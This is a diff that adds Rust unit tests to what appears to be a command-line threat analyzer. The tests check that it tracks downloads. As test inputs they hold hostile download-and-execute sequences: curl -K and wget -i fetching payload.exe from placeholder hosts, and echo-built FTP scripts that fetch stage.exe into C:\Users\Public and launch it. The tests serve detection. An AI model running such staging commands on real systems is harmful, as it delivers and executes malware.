@@ -8297,7 +8297,7 @@ mod powershell_tests {
 #[cfg(test)]
 mod curl_tests {
     use crate::analyze;
-    use crate::env::{Config, Environment};
+    use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
 
@@ -8333,6 +8333,37 @@ mod curl_tests {
         ));
         assert!(has, "traits: {:?}", env.traits);
         assert!(env.modified_filesystem.contains_key("out.exe"));
+    }
+
+    #[test]
+    fn curl_config_file_reads_tracked_url_and_output() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"echo url = "https://curl-config-file.example/payload.exe">curl.cfg"#,
+            &mut env,
+        );
+        interpret_line(r#"echo output = "payload.exe">>curl.cfg"#, &mut env);
+        interpret_line("curl -K curl.cfg", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-config-file.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "curl config file did not emit structured download: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("payload.exe"),
+                Some(FsEntry::Download { src })
+                    if src == "https://curl-config-file.example/payload.exe"
+            ),
+            "curl config file did not record destination: {:?}",
+            env.modified_filesystem
+        );
     }
 
     #[test]
@@ -8864,7 +8895,7 @@ mshta C:/Temp/payload.hta"#,
 #[cfg(test)]
 mod wget_tests {
     use crate::analyze;
-    use crate::env::{Config, Environment};
+    use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
 
@@ -9043,6 +9074,36 @@ mshta payload.hta"#,
             vec![("http://get-input.example/list.txt", None)],
             "traits: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn wget_input_file_reads_tracked_url_list() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"echo https://wget-input-file.example/payload.exe>urls.txt"#,
+            &mut env,
+        );
+        interpret_line(r#"wget -i urls.txt -O payload.exe"#, &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wget-input-file.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "wget -i tracked input file did not emit structured download: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("payload.exe"),
+                Some(FsEntry::Download { src })
+                    if src == "https://wget-input-file.example/payload.exe"
+            ),
+            "wget -i tracked input file did not record destination: {:?}",
+            env.modified_filesystem
         );
     }
 
@@ -19686,6 +19747,79 @@ ftp.exe -s:f.scr"#,
                 )
             }),
             "ftp script cwd/default destination was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ftp_script_lcd_applies_to_default_get_destination() {
+        let report = analyze(
+            br#"echo open ftp-lcd.example.net>f.scr
+echo lcd C:\Users\Public>>f.scr
+echo get stage.exe>>f.scr
+ftp.exe -s:f.scr
+start C:\Users\Public\stage.exe"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "ftp://ftp-lcd.example.net/stage.exe"
+                            && dst.as_deref() == Some(r#"C:\Users\Public\stage.exe"#)
+                )
+            }),
+            "ftp script lcd/default destination was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start C:\Users\Public\stage.exe"#
+                            && url == "ftp://ftp-lcd.example.net/stage.exe"
+                )
+            }),
+            "later start did not resolve ftp lcd download destination: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn ftp_script_mget_single_file_is_downloaded() {
+        let report = analyze(
+            br#"echo open ftp-mget.example.net>f.scr
+echo cd payloads>>f.scr
+echo lcd C:\Users\Public>>f.scr
+echo mget stage.exe>>f.scr
+ftp.exe -s:f.scr
+start C:\Users\Public\stage.exe"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "ftp://ftp-mget.example.net/payloads/stage.exe"
+                            && dst.as_deref() == Some(r#"C:\Users\Public\stage.exe"#)
+                )
+            }),
+            "ftp script mget file was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start C:\Users\Public\stage.exe"#
+                            && url == "ftp://ftp-mget.example.net/payloads/stage.exe"
+                )
+            }),
+            "later start did not resolve ftp mget destination: {:?}",
             report.traits
         );
     }
